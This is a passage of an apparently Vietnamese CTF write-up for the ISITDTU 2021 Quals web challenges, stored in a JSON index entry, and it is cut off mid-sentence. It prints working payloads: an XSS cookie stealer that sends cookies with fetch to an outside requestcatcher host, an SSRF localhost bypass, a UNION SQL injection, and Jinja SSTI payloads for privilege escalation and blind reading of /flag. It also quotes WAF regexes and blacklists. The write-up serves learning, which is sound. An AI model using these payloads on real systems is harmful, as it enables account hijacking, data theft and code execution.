[ { "title": "Write-up for all ISITDTU CTF Quals 2021 &#39;s web challenges", "url": "/posts/ISITDTU-Quals-Web/", "categories": "CTF, Web Challenges", "tags": "writeups, web, isitdtu21", "date": "2021-12-08 11:22:00 +0700", "snippet": " TLDR:Ở ISITDTU CTF 2021 thì team 0ni0n của mình đã không vào được Final. Tuy nhiên, với tinh thần tham gia giải lần đầu để học hỏi là chính thì mình quyết định write-up lại toàn bộ web challenge ở vòng Quals này, kể cả các challenge mình chưa giải được, nhìn chung tất cả đều thú vị và nhiều “hành”. simpleWAF Đây là challenge web đầu và cũng là dễ nhất trong 4 challenge của ISITDTU CTF năm nay. Dù vậy vì một số lí do ngu người nên mất cả buối sáng mình mới solve đc bài này.[+] Source1. Initial reconnaissance: Nhìn qua challenge này cho hẳn source với rất nhiều regex, cùng với một cái url parameter to tướng ở phía trên tên là XSS thì chắc chắn hướng đi sẽ là từ reflected XSS lấy cookie của client. Đề bài còn cho biết: if you can steal cookie, bot will check it at here, nghĩa là sau khi exploit lấy cookie thành công từ site chính rồi, chúng ta sẽ submit payload cho con bot dưới đây check xem có hợp lệ và nếu đúng nó sẽ trả cho chúng ta flag.2. Analyze and find the vulnerabilities: Đầu tiên, website sẽ lấy ra string từ url parameter xss rồi check xem nó đã đc url encode chuẩn chưa (thông qua vòng while). Sau đó nếu như trong string đó có các HTML entities thì nó sẽ trở về dạng HTML tag bình thường thông qua hàm html_entity_decode.$xss = $_GET[&#39;xss&#39;];$tmpxss = $xss;do{ $xss = $tmpxss; $tmpxss = urldecode($xss);} while($tmpxss != $xss);$xss = html_entity_decode($xss); Tiếp theo là phần phải đụng cơ tay một tí là bypass regex. Nhìn qua ta có thể thấy regex sẽ filter các string như on&amp;lt;gì đó&amp;gt;=, src=, href=, &amp;lt;script, &amp;lt;object nếu nó xuất hiện trong biến $xss ở trên. Nếu có xuất hiện sẽ in ra WAF block, nếu không thì payload là hợp lệ và sẽ được in ra$valid = true;if(preg_match(&quot;/\\&amp;lt;\\w+.*on\\w+=.*/i&quot;, $xss)){ $valid = false;}if(preg_match(&quot;/\\&amp;lt;\\w+.*src=.*/i&quot;, $xss)){ $valid = false;}if(preg_match(&quot;/\\&amp;lt;\\w+.*href=.*/i&quot;, $xss)){ $valid = false;}if(preg_match(&quot;/\\&amp;lt;script.*/i&quot;, $xss)){ $valid = false;}if(preg_match(&quot;/\\&amp;lt;object.*/i&quot;, $xss)){ $valid = false;}if($valid == true){ echo $xss;}else{ echo &quot;WAF block&quot;;} Các string như on&amp;lt;gì đó&amp;gt;=, src=, href=, &amp;lt;script, &amp;lt;object thường xuất hiện trong các xss payload, giờ đã bị ban. Vậy thì làm sao để nó hợp lệ? Chợt nhận ra thằng web này nó chỉ cấm mình dùng on&amp;lt;gì đó&amp;gt;= chứ không cấm mình dùng on&amp;lt;gì đó&amp;gt; = (thêm 1 dấu cách vào, thậm chí muốn chắc kèo thêm kí tự \\n vào cũng được luôn). Thí dụ chúng ta có thể xài một cái payload như này: Dùng payload w rồi thử alert một cái chơi:Amazing, giờ viết script để gửi cookie về domain của mình thôi!3. Exploit and get flag: Ý tưởng về việc steal cookie nó sẽ tóm gọn như này (sử dụng fetch API):fetch(&#39;&amp;lt;URL muốn gửi đến&amp;gt;&#39;, {method: &#39;POST&#39;,mode: &#39;no-cors&#39;,body:document.cookie}); Nhét nó vào payload để chạy trên web này nó sẽ thành như sau:%3Cimg%20src/%20%0Donerror%0D%20=%22fetch(%27&amp;lt;URL muốn gửi đến&amp;gt;%27,%20{method:%20%27POST%27,%20mode:%20%27no-cors%27%20,body:document.cookie})%22%3E Ví dụ ta có url muốn gửi đến là https://jxkku1rri7bor6fs1hjaeu4yyp4fs4.burpcollaborator.net (sử dụng Burp Collaborator client để tạo các domain như này, đồng thời bắt các request gửi về khi payload chạy): Tiếp theo mình sẽ submit cái nguyên si cái payload này cho con bot để lấy flag và tiếp tục sử dụng Burp Collaborator client để bắt request, và đây là nơi cái ngu bắt đầu :). Không hiểu bằng một cách magic nào đó mà lần này nó chỉ gửi mỗi DNS request đến Burp Collaborator client, trong khi thứ ta đang cần là một HTTP request như ảnh trên :(. Mình đã tốn thời gian cho một việc ngu ngốc là gửi đi gửi lại dù biết nó sẽ sai, cho đến khi được người ra đề là anh “0xd0ff9” gõ đầu mới ngộ ra:Có vẻ có vấn đề gì đó với policy của Chrome phiên bản mới nhất, sau một hồi search gg và hỏi khắp nới thì t biết được policy của chrome mới nhất ko cho phép redirect qua HTTP, do đó Burp Collaborator client sẽ không bắt được HTTP. Nhưng mà trước khi biết được điều này thì t đã mò đại được cái webhook hay ho https://requestcatcher.com/ này để bắt request, và nó đã hoạt động :DMy final payload:https://simplewaf.duckdns.org/6ef051ac3d7b644cb6b3c22fef5677a1/?xss=%3Cimg%20src/%20%0Donerror%0D%20=%22fetch(%27https://antoine.requestcatcher.com/%27,%20{method:%20%27POST%27,%20mode:%20%27no-cors%27%20,body:document.cookie})%22%3EFlag: ISITDTU{64858f4560416acff930bf673b5046911947a26e} lastpoint Challenge này thì nhờ 1 chút “rùa” và chăm đọc cheat sheet mà mình giải nhanh hơn bình thường :D[+] Source1. Initial reconnaissance:Đầu tiên chúng ta cần tạo account để login vào:Xem qua source của trang login và register cũng bình thường không có gì, chỉ còn mỗi 2 trang index và home để chúng ta xem xét.2. Analyze and find the vulnerabilities:a) index.php:Mới nhìn vào có vẻ đây là tính năng nhập một URL bất kì rồi trả về nội dung của URL đó. Hướng đi của challenge này có vẻ là là khai thác SSRF rồi. Nhưng trước hết chúng ta sẽ gặp vật cản đầu tiên là hàm filter dưới đây:function filter($url) { $black_lists = [&#39;127.0.0.1&#39;, &#39;0.0.0.0&#39;]; $url_parse = parse_url($url); $ip = gethostbyname($url_parse[&#39;host&#39;]); if (in_array($ip,$black_lists)) { return false; } return true;}Tác giả đã lộ rõ ý đồ blacklist 2 ip là 127.0.0.1 và 0.0.0.0, vì 2 ip này đếu trỏ đến localhost, điểm mấu chốt để khai thác SSRF. Thậm chí ngay cả khi bạn nhập vào url https://localhost/home.php rồi submit thì nó cũng cho kết quả tương tự:Không những blacklist 2 ip này mà tác giả còn sanitize và validate biến $url bằng cách lowercase, regex. Nếu pass qua được hết thì một curl session sẽ được tạo với biến $url, kết quả của curl session này sẽ được trả về tại biến $output (tham khảo về cách dùng curl tại đây). Còn nếu không pass sẽ kết thúc chương trình và in ra “NO NO NO NO” như hình trên:$url = strtolower($_POST[&#39;url&#39;]);$check = filter($url);if (filter_var($url,FILTER_VALIDATE_URL,FILTER_FLAG_IPV4) &amp;amp;&amp;amp; preg_match(&#39;/(^https?:\\/\\/[^:\\/]+)/&#39;,$url) &amp;amp;&amp;amp; $check) { sleep(1); $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false); curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3); curl_setopt($ch, CURLOPT_TIMEOUT, 1); $output = curl_exec($ch); curl_close($ch);} else { die (&quot;NO NO NO NO&quot;);}b) home.php:Có lẽ có một tính năng “ẩn” ở home.php vì một lí do nào đó chúng ta lại không sử dụng được. Từ source ta biết được rằng home.php luôn luôn in ra “This is not a private ip” nếu như client ip address trong request gửi đến trang này không phải là 127.0.0.1:if ($_SERVER[&#39;REMOTE_ADDR&#39;] !== &quot;127.0.0.1&quot;) { die(&quot;&amp;lt;center&amp;gt;This is not a private ip&amp;lt;/center&amp;gt;&quot;);}Xem kĩ source thì chúng ta biết được tính năng “ẩn” đó cho phép chúng ta truy vấn thông tin của các user trên web app này thông qua url parameter là id:if (isset($_GET[&#39;id&#39;])) { $id = $_GET[&#39;id&#39;]; if (!preg_match(&#39;/sys|procedure|xml|concat|group|db|where|like|limit|in|0x|extract|by|load|as|binary| join|using|pow|column|table|exp|info|insert|to|del|admin|pass|sec|hex|username|regex|id|if|case|and|or|ascii|[~.^\\-\\/\\\\\\=&amp;lt;&amp;gt;+\\&#39;&quot;$%#]/i&#39;,$id) &amp;amp;&amp;amp; strlen($id) &amp;lt; 90) { $query = &quot;SELECT id,username FROM users WHERE id={$id};&quot;; $result = $conn-&amp;gt;query($query); while ($row = $result-&amp;gt;fetch_assoc()) { echo &quot;&amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;&quot;.$row[&#39;id&#39;].&quot;&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;&quot;.$row[&#39;username&#39;]; } $result-&amp;gt;free(); }}Nhưng đoạn code trên lại không dùng prepared statement để truy vấn mà lại dùng hàm query. Do đó chắn chắn sẽ bị SQL Injection, vấn đề chỉ nằm ở việc có bypass được cái regex /sys|procedure|xml|concat|group|db|where|like|limit|in|0x|extract|by|load|as|binary|join|using|pow|column|table|exp|info|insert|to|del|admin|pass|sec|hex|username|regex|id|if|case|and|or|ascii|[~.^\\-\\/\\\\\\=&amp;lt;&amp;gt;+\\&#39;&quot;$%#]/i hay không. Có lẽ khai thác SQLi xong chúng ta sẽ lấy được flag?3. Exploit and get flag:Sau khi xem xét 2 tính năng của index.php và home.php, chúng ta có thể rút ra hướng để khai thác như sau: Bypass SSRF filter ở chức năng submit url tại trang index.php sao cho có thể gọi đến localhost của chính web app này, dùng nó để request và in ra nội dung của home.php. In ra được home.php thì chỉ việc bypass regex nữa là tha hồ lượn trong database của cái app này.a) Bypass SSRF filter:Để bypass được mọi thể loại filter thì cách nhàn hạ và nhanh nhất để là đi mò cheat sheet :D Sau khi thử hàng loạt payload trong cái SSRF cheat sheet thần thành này thì mình phát hiện ra có cái này dùng được:http://[0:0:0:0:0:ffff:127.0.0.1]b) Bypass SQLi filter:Trong regex dùng để filter SQLi này:/sys|procedure|xml|concat|group|db|where|like|limit|in|0x|extract|by|load|as|binary|join|using|pow|column|table|exp|info|insert|to|del|admin|pass|sec|hex|username|regex|id|if|case|and|or|ascii|[~.^\\-\\/\\\\\\=&amp;lt;&amp;gt;+\\&#39;&quot;$%#]/iChúng ta phát hiện ra không có union trong số đó. Vậy thì còn ngần ngại gì mà không UNION attack nữa!Mục tiêu của việc exploit SQLi theo kiểu UNION attack là in ra toàn bộ data từ table user. Nếu như phải test black box thì cần có 1 bước là xác định số cột của user, nhưng mà trong source có luôn cả script sql (main.sql) tạo table này nên không cần phải làm nữa:CREATE TABLE `users` ( `id` int(11) NOT NULL, `username` text NOT NULL, `password` text NOT NULL, `[CENSORED]` text NOT NULL) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;Table user có 4 column, nhưng lại có 1 column “ẩn” được đánh dấu là [CENSORED], rất có thể flag sẽ nằm trong column này. Mặc dù không biết tên column này nhưng chúng ta lại biết được column này có index là 4 trong table user. Liệu có thể dùng SELECT để query user nhưng không dùng tên mà chỉ dùng index của column?Nếu kết hợp khéo léo một chút giữa SELECT và hàm make_set() trong MySQL thì câu trả lời là có. Quá trình build script với ý tưởng này khá là loằng ngoằng, bạn có thể xem tóm tắt trong hình dưới. Ở đây mình tạo một table user tương tự như của web app nhưng chỉ có 2 cột là id và username.Oke, vậy payload SQLi cuối cùng sẽ là:1 union select 1,make_set(1|4,`2`,`3`,`4`)from(select 1,2,3,4 union select * from users)aGhép với payload SSRF ở trên nữa ta sẽ lấy được flag:My final payload:http://[0:0:0:0:0:ffff:127.0.0.1]/home.php?id=1%20union%20select%201,make_set(1%7c4,%602%60,%603%60,%604%60)from(select%201,2,3,4%20union%20select%20*%20from%20users)aFlag: ISITDTU{w0w_SSRF_ch4in_SQLI_3Zzzz_h3he_!!!!} ez get flag Hơi đáng tiếc vì mình không thể clear được challenge này trong thời gian của cuộc thi. Nhưng không sao, năng lực của mình chỉ đến vậy thì phải chấp nhận, quan trọng là mình đã không chán nản mà vẫn tiếp tục cày cho tới khi clear challenge này, kể cả khi ISITDTU CTF đã end.Source1. Initial reconnaissance:Thoạt nhìn thì ai cũng tưởng sẽ phải vào register để tạo một account mới rồi login vào, nhưng đời không đơn giản như vậy. Nó thậm chí còn không cho register!Khi nhập linh tinh vào các field của trang login thì nó sẽ ra như này:Check source của bài này thì chỉ có 2 trang register và login này cho phép free-access. Như vậy chúng ta chỉ còn cách bypass login để mà vào bên trong.2. Bypass login:Ta có source của chức năng login như sau:def login(): if &#39;username&#39; in session: return redirect(url_for(&#39;home&#39;)) else: if request.method == &quot;POST&quot;: username, password = &#39;&#39;, &#39;&#39; username = request.form[&#39;username&#39;] password = request.form[&#39;password&#39;] if sql.login_check(username,password) &amp;gt; 0 and username == &#39;admin&#39;: session[&#39;username&#39;] = &#39;admin&#39; session[&#39;check&#39;] = 1 return render_template(&#39;home.html&#39;) else: cc, secret = &#39;&#39;, &#39;&#39; cc = request.form[&#39;captcha&#39;] secret = request.form[&#39;secret&#39;] if captcha.check_captcha(cc): session[&#39;username&#39;] = &#39;guest&#39; session[&#39;check&#39;] = 0 session[&#39;sr&#39;] = secret return redirect(url_for(&#39;home&#39;)) return render_template(&#39;login.html&#39;, msg=&#39;Ohhhh Noo - Incorrect !&#39;) return render_template(&#39;login.html&#39;)Từ source ta có thể tóm tắt các thức hoạt động của trang login như sau: Web app này có 2 role là admin và guest, và kiểm tra user thuộc role nào thông qua object session. Dù user là admin hay guest thì sau khi login xong đều được redirect đến trang home. Điểm khác biệt ở đây là admin sẽ có session[&#39;check&#39;] = 1 còn guest thì có session[&#39;check&#39;] = 0 kèm theo đó là session[&#39;sr&#39;] = secret, với biến secret được nhập vào từ field Secret (option) của login form.Điều kiện để có thể login như một admin đó là sql.login_check(username,password) &amp;gt; 0 và username == &#39;admin&#39;. Check hàm login_check xem sao:def login_check(username, password): conn = sqlite3.connect(&#39;database/users.db&#39;) row = conn.execute(&quot;SELECT * from users where username = ? and password = ?&quot;, (username, hashlib.sha1(password.encode()).hexdigest(), )).fetchall() return len(row)Như vậy chức năng login sẽ connect với database/users.db và query từ table users để check. Theo yêu cầu thứ 2 thì admin cần có username == &#39;admin&#39; nhưng khi check database/users.db thì lại chỉ có 1 row như này:Cột password trong table users đã bị hash. Mà kể cả chúng ta có crack được hash này thì username sẽ là taidh chứ không phải admin, bỏ phương án crack hash này đi cho đỡ mất công.Quay sang tìm cách để trở thành guest. Điều kiện để có thể login như một guest đó là captcha.check_captcha(cc) == True. Mặc kệ các field còn lại là username, password, secret (option) có như thế nào, chỉ cần nhập đúng captcha vào field Captcha là vào được trang home. Check hàm check_captcha xem sao:SECRET = &#39;[CENSORED]&#39; # this is captchaCHECK = &#39;203c0617e3bde7ec99b5b657417a75131e3629b8ffdfdbbbbfd02332&#39;def check_captcha(cc): msg = b&#39;hello &#39; msg += cc.encode() if calculate(msg) == CHECK: return True return Falsedef calculate(msg): c = [] a = ord(b&#39;[CENSORED]&#39;) b = ord(b&#39;[CENSORED]&#39;) for m in msg: c.append(a ^ m) a = (a + b) % 256 return bytes(c).hex()Biến cc sau khi truyền vào hàm check_captcha sẽ được concat với giá trị IV là biến msg (msg = b&#39;hello &#39;), sau đó cho tất cả vào hàm calculate để gen ra một đoạn mã SECRET, và SECRET phải giống y như biến CHECK. Bài toán đặt ra cho chúng ta là: “Tìm 2 giá trị a và b, cho biết giá trị IV và CHECK”.Phân tích hàm caculate thì ta biết được SECRET được tạo ra như sau: Tạo một list rỗng c, sau đó qua mỗi vòng lặp for m in msg sẽ append thêm a^m (a XOR m), đồng thời giá trị a sẽ liên tục thay đổi sau 1 vòng lặp theo công thức a = (a + b) % 256. Sau khi đã append hết thì list c sẽ được convert sang dạng bytes và cuối cùng là một string chứa các giá trị hex. List c và hex string &#39;01020304050607&#39; chỉ mang tính chất minh họa, trên thực tế thì phải là bytes(c).hex() == CHECK. Lật ngược vấn đề, từ biến CHECK đã cho chúng ta có thể tìm ra list c? Giải pháp là sử dụng hàm fromhex:Từ vòng lặp for m in msg: thứ nhất ta có c[0] = a₀ ^ m₀ ⟺ c[0] = a ^ msg[0], tìm ra được a = 72 = ord(&#39;H&#39;). Sang vòng lặp thứ 2, ta lại có c[1] = a₁ ^ m₁ ⟺ c[1] = a₁ ^ msg[1] ⟺ a₁ = 60 ^ 101 = 89, từ a₁ và a₀ tìm ra được b = 17 = ord(&#39;\\x11&#39;) theo công thức: a₁ = (a₀+b) % 256.Tìm được a và b thì coi như bài toán đã kết thúc, chúng ta chỉ chạy một vòng lặp tương tự của hàm calculate, nhưng thay vì cho a đi xor với từng bytes của msg thì ta xor thẳng với CHECK:def gen_captcha(): SECRET = &#39;[CENSORED]&#39; # this is captcha CHECK = &#39;203c0617e3bde7ec99b5b657417a75131e3629b8ffdfdbbbbfd02332&#39; head = b&#39;hello &#39; array_check = list(bytes.fromhex(CHECK)) ord_a = array_check[0] ^ head[0] ord_b = (array_check[1] ^ head[1]) - ord_a head_secret = &#39;&#39; for r in array_check: head_secret += chr(ord_a ^ r) ord_a = (ord_a + ord_b) % 256 if head.decode(&#39;utf-8&#39;) in head_secret: SECRET = head_secret.replace(head.decode(&#39;utf-8&#39;), &#39;&#39;) return SECRET Chạy script ta có SECRET = ISITDTU_CTF_S3cret_!!!, nhập captcha này vào login form chúng ta sẽ vào được home:3. Privilege escalation to become admin:Để ý vào dòng “Your secret: …” ở chức năng home. Nó sẽ trả về những gì chúng ta nhập vào tại field Secret (option) thông qua template engine của web app là Jinja. Liệu nó có bị dính SSTI hay không? Câu trả lời là không vì chức năng này đang sử dụng hàm render_template để đẩy dynamic content từ biến secret vào một static template file là home.html.# home function@app.route(&#39;/home&#39;)def home(): if &#39;username&#39; in session: secret = session[&#39;sr&#39;] return render_template(&#39;home.html&#39;, secret=secret) return redirect(url_for(&#39;login&#39;))&amp;lt;!-- home.html --&amp;gt;{% if secret %}&amp;lt;i&amp;gt;&amp;lt;h3 class=&quot;jumbotron-heading&quot;&amp;gt;Your secret: {{secret}}&amp;lt;/h3&amp;gt;&amp;lt;/i&amp;gt;{% endif %}Mà theo một bài research của PortSwigger về SSTI thì: Static templates that simply provide placeholders into which dynamic content is rendered are generally not vulnerable to server-side template injection.Tuy vậy, trong quá trình research các hàm dùng để render content của web app này thì mình phát hiện trong source có một đoạn tác giả không sử dụng hàm render_template, thay vào đó là render_template_string (xem sự khác nhau giữa 2 hàm render này tại đây), nằm ở chức năng rate:if session[&#39;username&#39;] == &#39;admin&#39; and session[&#39;check&#39;] == 1: picture = picture.replace(&#39;{{&#39;,&#39;{&#39;).replace(&#39;}}&#39;,&#39;}&#39;).replace(&#39;&amp;gt;&#39;,&#39;&#39;).replace(&#39;#&#39;,&#39;&#39;).replace(&#39;&amp;lt;&#39;,&#39;&#39;) if waf.isValid(picture): render_template_string(picture) return &#39;you are admin you can choose all :)&#39;else: _waf = [&#39;{{&#39;,&#39;+&#39;,&#39;~&#39;,&#39;&quot;&#39;,&#39;_&#39;,&#39;|&#39;,&#39;\\\\&#39;,&#39;[&#39;,&#39;]&#39;,&#39;#&#39;,&#39;&amp;gt;&#39;,&#39;&amp;lt;&#39;,&#39;!&#39;,&#39;config&#39;,&#39;==&#39;,&#39;}}&#39;] for char in _waf: if char in picture: picture = picture.replace(char,&#39;&#39;) if waf.check_len(picture): render_template_string(picture) return &#39;you are wonderful ♥&#39;Chức năng rate ở 2 role admin và guest đều hoạt động giống như nhau, đều render_template_string(picture) ở cuối, nhưng ở role admin thì biến picture bị filter nhẹ tay hơn so với ở role guest (bạn có thể kiếm tra 2 hàm check_len và isValid trong waf.py là thấy rõ). Do đó hướng đi của mình là privilege escalate lên admin bằng SSTI cho dễ thở. Lí do tại sao truyền thẳng một string vào hàm render_template_string lại có thể gây ra SSTI thì các bạn có thể đọc tại đây. Mình xin được đi thẳng vào luôn phần bypass và exploit, vì endpoint bị dính SSTI đã hiện ra ngay tại đây rồi:Vấn đề là chúng ta phải bypass được cái black list _wafcủa guest:_waf = [&#39;{{&#39;,&#39;+&#39;,&#39;~&#39;,&#39;&quot;&#39;,&#39;_&#39;,&#39;|&#39;,&#39;\\\\&#39;,&#39;[&#39;,&#39;]&#39;,&#39;#&#39;,&#39;&amp;gt;&#39;,&#39;&amp;lt;&#39;,&#39;!&#39;,&#39;config&#39;,&#39;==&#39;,&#39;}}&#39;]Trước mắt chúng ta thấy “{{…}}”, vốn dùng để biểu diễn một expression trong Jinja đã bị blacklist. Nhưng chúng ta vẫn có thể dùng “{%…%}” - control statement để làm vài trò hay ho, trong đó có gán giá trị cho các template variable. Thông thường thì các template variable của jinja ở phía front end sẽ độc lập hoàn toàn với các variable cùng tên của python ở phía back end, khi có 2 điều kiện được thỏa mãn là variable cùng tên đó của Python không được truyền vào template variable của Jinja thông qua các hàm render và trong control statement của Jinja không có một variable cùng tên được khai báo. Lấy 2 đoạn code kèm output tương ứng của nó như sau làm ví dụ:# case 1from flask import Flask, render_template_stringapp = Flask(__name__)@app.route(&#39;/&#39;)def home(): name = &#39;antoine&#39; # variable &quot;name&quot; in Python picture = &quot;&quot;&quot;{{name}}&quot;&quot;&quot; # template variable &quot;name&quot; in Jinja print(name) # output: &quot;antoine&quot; return render_template_string(picture, name=name) # variable &quot;name&quot; in Python is passed to template variable &quot;name&quot; in Jinja.if __name__ == &#39;__main__&#39;: app.run(debug=True)# case 2from flask import Flask, render_template_stringapp = Flask(__name__)@app.route(&#39;/&#39;)def home(): name = &#39;antoine&#39; # variable &quot;name&quot; in Python picture = &quot;&quot;&quot;{%set name=&#39;nguyen&#39;%}{{name}}&quot;&quot;&quot; # template variable &quot;name&quot; in Jinja print(name) # output: &quot;antoine&quot; return render_template_string(picture, name=name) # variable &quot;name&quot; in Python is passed to template variable &quot;name&quot; in Jinja. However, there is a variable &quot;name&quot; initialized and assigned with &quot;nguyen&quot; in control statement of Jinja, so the template displayed as following.if __name__ == &#39;__main__&#39;: app.run(debug=True)Trường hợp tương tự cũng xảy ra với các instance được tạo từ các subclass của module Flask như session.# session saved in server side.from flask import Flask, render_template_string, sessionapp = Flask(__name__)app.config[&#39;SECRET_KEY&#39;] = &#39;antoine&#39;@app.route(&#39;/&#39;)def home(): session[&#39;username&#39;] = &#39;guest&#39; session[&#39;check&#39;] = 0 picture = &quot;&quot;&quot;{%set a=session.update({&#39;username&#39;:&#39;admin&#39;,&#39;check&#39;:1})%}&quot;&quot;&quot; print(session) # output: {&#39;check&#39;: 0, &#39;username&#39;: &#39;guest&#39;} return render_template_string(picture)if __name__ == &#39;__main__&#39;: app.run(debug=True)Theo lời chú thích ở ảnh thì chúng ta hoàn toàn có thể gửi cookie đã bị thay đổi và privilege escalate lên admin bằng payload sau:{%set a=session.update({&#39;username&#39;:&#39;admin&#39;,&#39;check&#39;:1})%}Submit rồi refresh lại trang, chúng ta sẽ thấy dòng này thay vì “you are wonderful ♥”:4. Exploit Blind SSTI by triggering error and get the flagNhư vậy công việc cuối cùng của chúng ta là tìm cách đọc được file flag. Tuy nhiên, lại xuất hiện thêm một khó khăn nữa, đó là những gì xuất hiện trên response sẽ được Flask trả về dựa trên kết quả của câu lệnh return. Mà thứ chúng ta cần là render_template_string(picture) thì nó lại không được return. Do đó chúng ta không thể một phát đọc luôn nội dung của flag.if waf.isValid(picture): render_template_string(picture) # this won&#39;t never be appear in response :(return &#39;you are admin you can choose all :)&#39; # this will always appear in response!Đã từng thấy Blind SQL Injection, Blind Command Injection,… nhưng đây là lần đầu tiên mình thấy Blind SSTI =)))). Về cơ bản thì hầu hết các vuln Blind Injection đều có các case khai thác phổ biến như trigger time delays, errors, out-of-band,… Mình quyết định khai thác case Blind SSTI bằng cách trigger errors, vì nó dễ viết code khai thác:v:Trước hết, mọi ý tưởng về khai thác SSTI đều hướng tới mục đích cuối cùng là bypass python sandbox (python jail), từ “không có gì” cho đến gọi được các hàm “nguy hiểm” dùng để đọc file, chạy command, đồng nghĩa với RCE thành công (các bạn có thể xem một bài viết của tôi về escape python jail). Python sandbox ở đây mà chúng ta cần bypass ở đây chính là Jinja, vì mặc dù Jinja có syntax khá giống Python, cho phép nhúng code Python vào nhưng bản chất nó không phải là Python. Bạn sẽ hiểu điều này khi nghiên cứu về Jinja API. Về cơ bản thì API của Jinja được chia thành High Level API và Low Level API, và các API này đều có thể gọi được trong Python bằng cách from jinja2 import &amp;lt;module&#39;s name&amp;gt;: The high-level API is the API you will use in the application to load and render Jinja templates. The Low Level API on the other side is only useful if you want to dig deeper into Jinja or develop extensions.Trong high-level API có một class rất đặc biệt là jinja2.Undefined: These classes can be used as undefined types. The Environment constructor takes an undefined parameter that can be one of those classes or a custom subclass of Undefined. Whenever the template engine is unable to look up a name or access an attribute one of those objects is created and returned. Some operations on undefined values are then allowed, others fail.Ví dụ về một instance của class jinja2.Undefined:from jinja2 import Templatemsg = Template(&quot;{{ module.type(t) }}&quot;).render(module=__builtins__) # variable &quot;t&quot; in template wasn&#39;t initialize and Jinja engine is unable to look up íts name, so Jinja treat it as undefined class.print(msg) # output: &amp;lt;class &#39;jinja2.runtime.Undefined&#39;&amp;gt;Mà theo mình nhớ trong Python thì tất cả mọi class đều có 1 magic method là __init__ (giống như mọi class của Java đều phải có constructor vậy). Và class jinja2.Undefined cũng không phải ngoại lệ (các bạn có thể xem danh sách các method của class này tại đây). Gọi được method __init__ là đồng nghĩa với trở về dạng SSTI quen thuộc thường thấy trên cheat sheet:&amp;lt;object&amp;gt;.__init__.__globals__.__builtins__.&amp;lt;a builtins method in Python&amp;gt;Bạn có thể đọc doc để hiểu rõ hơn về __builtins__ và mình xin trích dẫn lại định nghĩa ngắn gọn về __globals__ từ đây: A reference to the dictionary that holds the function’s global variables — the global namespace of the module in which the function was defined.Nhưng vì cảm thấy game vẫn chưa đủ khó, tác giả đã blacklist luôn cả 2 __globals__ và __builtins__ :DBLACK_LIST = [ &#39;class&#39;, &#39;mro&#39;, &#39;base&#39;, &#39;request&#39;, &#39;app&#39;, &#39;sleep&#39;, &#39;add&#39;, &#39;+&#39;, &#39;config&#39;, &#39;subclasses&#39;, &#39;format&#39;, &#39;dict&#39;, &#39;get&#39;, &#39;attr&#39;, &#39;globals&#39;, &#39;time&#39;, &#39;read&#39;, &#39;import&#39;, &#39;sys&#39;, &#39;cookies&#39;, &#39;headers&#39;, &#39;doc&#39;, &#39;url&#39;, &#39;encode&#39;, &#39;decode&#39;, &#39;chr&#39;, &#39;ord&#39;, &#39;replace&#39;, &#39;echo&#39;, &#39;pop&#39;, &#39;builtins&#39;, &#39;self&#39;, &#39;template&#39;, &#39;print&#39;, &#39;exec&#39;, &#39;response&#39;, &#39;join&#39;, &#39;{}&#39;, &#39;%s&#39;, &#39;\\\\&#39;, &#39;*&#39;, &#39;#&#39;, &#39;&amp;amp;&#39;]Nếu đọc cái BLACK_LIST này xong mà ta vẫn đâm đầu vào cheat sheat để kiếm một payload mới thì chắc là “No Hope!”. Mình chợt nhớ ra trong Jinja có một “magic” cho phép thay đổi các template variable là Filters, và trong số các “Filter” có reverse cho phép đảo ngược mọi thứ!from flask import Flask, render_template_stringapp = Flask(__name__)@app.route(&#39;/&#39;)def home(): picture = &quot;&quot;&quot;{{ &#39;abc&#39;|reverse }}&quot;&quot;&quot; return render_template_string(picture)if __name__ == &#39;__main__&#39;: app.run(debug=True)Do đó trong payload chúng ta chỉ cần tạo 2 template variable như này là bypass được BLACK_LIST. Sau đó tham khảo thêm cheat sheat ta gọi được hàm eval để bắt đầu chạy script :{% set g=&#39;__slabolg__&#39;|reverse%}{% set b=&#39;__snitliub__&#39;|reverse%}{% set p=t.__init__[g][b][&#39;eval&#39;]%}{{p(&#39; s if str([i for i in open(&quot;/flag&quot;)])[s]==&quot;char&quot; else a&#39;,{&#39;s&#39;:&quot;index&quot;|length})}}Nói qua một chút về ý tưởng sử dụng {{p(&#39; s if str([i for i in open(&quot;/flag&quot;)])[s]==&quot;char&quot; else a&#39;,{&#39;s&#39;:&quot;index&quot;|length})}}. p đã được gán bằng method eval. Expression bên trong eval là:s if str([i for i in open(&quot;/flag&quot;)])[s]==&quot;char&quot; else aExpression trên dịch nôm na ra theo tiếng Hooman là như này: mở file /flag ra rồi quét hết nội dung của nó (sử dụng list comprehension) cho vào array rồi convert tất cả thành string, nếu tại index s của string này có chứa kí tự char thì sẽ trả về biến s, server sẽ trả về status code 200, nếu không sẽ trả về biến a. Mà biến a chưa được khai báo lần nào trong expression này nên khi eval sẽ bị lỗi, server sẽ trả về status code 500. Để biến s có thể iterate qua string trên thì tại parameter “globals” của hàm eval chúng ta sẽ gán s bằng độ dài của string “index” (sử dụng Filter length để lấy độ dài), và độ dài của string s sẽ tăng thêm 1 sau mỗi vòng lặp.Nếu bạn nghĩ đến đây là có thể build script rồi lấy flag ngon ăn thì nhầm rồi! Payload {{p(&#39; s if str([i for i in open(&quot;/flag&quot;)])[s]==&quot;char&quot; else a&#39;,{&#39;s&#39;:&quot;index&quot;|length})}} vẫn là chưa hợp lệ, vì trước khi được nạp vào hàm render_template_string nó sẽ bị sửa thành {p(&#39; s if str([i for i in open(&quot;/flag&quot;)])[s]==&quot;char&quot; else a&#39;,{&#39;s&#39;:&quot;index&quot;|length})}, do đó không còn là Jinja Expression và sẽ không chạy được:if session[&#39;username&#39;] == &#39;admin&#39; and session[&#39;check&#39;] == 1: picture = picture.replace(&#39;{{&#39;,&#39;{&#39;).replace(&#39;}}&#39;,&#39;}&#39;).replace(&#39;&amp;gt;&#39;,&#39;&#39;).replace(&#39;#&#39;,&#39;&#39;).replace(&#39;&amp;lt;&#39;,&#39;&#39;)Cách replace các kí tự bị cấm trong biến picture thành null này nhìn có vẻ an toàn, nhưng có một lỗ hổng nằm ở đoạn replace(&#39;&amp;gt;&#39;,&#39;&#39;) và replace(&#39;&amp;lt;&#39;,&#39;&#39;). Chúng ta chỉ cần thêm 2 dấu ‘&amp;gt;’ và 